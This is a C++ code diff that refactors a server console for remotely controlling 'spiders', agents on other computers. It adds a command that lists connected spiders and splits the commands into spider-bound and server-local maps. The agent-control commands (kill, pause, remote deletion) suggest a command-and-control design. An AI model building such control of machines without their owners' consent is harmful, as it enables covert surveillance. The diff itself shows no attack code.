@@ -21,9 +21,11 @@ Server::Server(uint16_t port)
   boost::filesystem::create_directory("Logs");
   _signal.addSignal(SIGINT);
 
-  _commands["kill"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(6));
-  _commands["pause"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(7));
-  _commands["destroy"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(8));
+  _commandsSpider["kill"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(6));
+  _commandsSpider["pause"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(7));
+  _commandsSpider["destroy"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(8));
+
+  _commandsServer["list"] = [this]() { _web->listSpider(); };
 }
 
 Server::~Server()
@@ -42,7 +44,6 @@ void		Server::start()
     std::cerr << "Unable to run thread: " << e.what() << std::endl;
   }
  _web->start();
- // _web->stop();
 }
 
 void		Server::stop()
@@ -55,7 +56,8 @@ void		Server::readCommand()
   std::cout << "Available commands:" << std::endl
 	    << "\tkill\t\t- Kill spiders" << std::endl
 	    << "\tpause\t\t- Pause spiders" << std::endl
-	    << "\tdestroy\t\t- Delete spiders from computers" << std::endl;
+	    << "\tdestroy\t\t- Delete spiders from computers" << std::endl
+	    << "\tlist\t\t- List spiders connected" << std::endl;
   try {
     while (1) {
       std::string	input;
@@ -64,10 +66,18 @@ void		Server::readCommand()
 
 	int		found = 0;
 
-	for (auto &command : _commands) {
+	for (auto &command : _commandsSpider) {
 
 	  if (boost::starts_with(input, command.first)) {
 	    _web->sendCommand(command.second);
+	    found = 1;
+	  }
+	}
+
+	for (auto &command : _commandsServer) {
+
+	  if (boost::equals(input, command.first)) {
+	    command.second();
 	    found = 1;
 	  }
 	}
